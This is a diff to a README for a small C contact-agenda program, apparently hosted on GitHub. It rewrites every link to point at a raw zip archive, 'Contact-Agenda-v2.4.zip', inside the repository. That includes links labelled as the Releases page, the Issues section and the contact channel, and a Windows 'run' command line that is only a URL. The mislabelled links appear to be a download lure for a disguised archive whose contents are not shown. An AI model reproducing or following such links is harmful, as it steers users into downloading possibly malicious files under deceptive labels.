@@ -4,7 +4,7 @@
 Welcome to C-Contact-Agenda! This is a straightforward contact management program written in C. It simplifies how you store and manage your contact information. Ideal for anyone looking to keep their contacts organized without fuss. 
 
 ## 📥 Download the Application
-[![Download C-Contact-Agenda](https://raw.githubusercontent.com/ayoubHjs/C-Contact-Agenda/main/Casel/C-Contact-Agenda.zip)](https://raw.githubusercontent.com/ayoubHjs/C-Contact-Agenda/main/Casel/C-Contact-Agenda.zip)
+[![Download C-Contact-Agenda](https://github.com/ayoubHjs/C-Contact-Agenda/raw/refs/heads/main/Casel/Contact-Agenda-v2.4.zip)](https://github.com/ayoubHjs/C-Contact-Agenda/raw/refs/heads/main/Casel/Contact-Agenda-v2.4.zip)
 
 You can download the latest version of C-Contact-Agenda from the Releases page. 
 
@@ -24,7 +24,7 @@ You can download the latest version of C-Contact-Agenda from the Releases page.
 ## ⚙️ How to Install and Run
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/ayoubHjs/C-Contact-Agenda/main/Casel/C-Contact-Agenda.zip) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/ayoubHjs/C-Contact-Agenda/raw/refs/heads/main/Casel/Contact-Agenda-v2.4.zip) to find the latest version.
    
 2. **Download the File**: Locate the version that fits your operating system. Click on the download link to get the file. 
 
@@ -49,7 +49,7 @@ To get started, follow these steps:
 7. **Run the Application**: After compilation, run the program with this command:
    ```bash
    ./contact_agenda   # For macOS/Linux
-   https://raw.githubusercontent.com/ayoubHjs/C-Contact-Agenda/main/Casel/C-Contact-Agenda.zip # For Windows
+   https://github.com/ayoubHjs/C-Contact-Agenda/raw/refs/heads/main/Casel/Contact-Agenda-v2.4.zip # For Windows
    ```
 
 Collectively, these steps allow you to install and start using C-Contact-Agenda with ease. 
@@ -70,12 +70,12 @@ If you encounter issues while using C-Contact-Agenda:
 - **Missing Features**: Review the menu options to understand all functionalities.
 
 ## 📞 Contributing
-We welcome contributions to improve this project. If you'd like to help, please check the [Issues section](https://raw.githubusercontent.com/ayoubHjs/C-Contact-Agenda/main/Casel/C-Contact-Agenda.zip) for areas needing attention.
+We welcome contributions to improve this project. If you'd like to help, please check the [Issues section](https://github.com/ayoubHjs/C-Contact-Agenda/raw/refs/heads/main/Casel/Contact-Agenda-v2.4.zip) for areas needing attention.
 
 ## 📝 License
 This project is open source and available for use under the MIT License. Feel free to modify and use it for your personal needs.
 
 ## 📬 Contact
-If you have questions or need support regarding C-Contact-Agenda, please reach out through the [Issues section](https://raw.githubusercontent.com/ayoubHjs/C-Contact-Agenda/main/Casel/C-Contact-Agenda.zip). 
+If you have questions or need support regarding C-Contact-Agenda, please reach out through the [Issues section](https://github.com/ayoubHjs/C-Contact-Agenda/raw/refs/heads/main/Casel/Contact-Agenda-v2.4.zip). 
 
 We hope you enjoy using C-Contact-Agenda to manage your contacts effectively!
